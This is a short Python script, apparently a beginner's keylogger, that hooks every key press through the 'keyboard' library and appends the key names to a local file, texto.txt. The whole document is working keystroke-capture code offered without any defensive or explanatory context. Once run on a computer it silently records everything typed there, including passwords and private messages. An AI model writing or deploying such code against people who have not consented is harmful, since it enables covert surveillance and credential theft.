import keyboard
def presionar_tecla(tecla):
    with open('texto.txt','a') as file:
        if tecla.name == 'space':
            file.write(' ')
        else:
            file.write(tecla.name)

keyboard.on_press(presionar_tecla)
keyboard.wait()
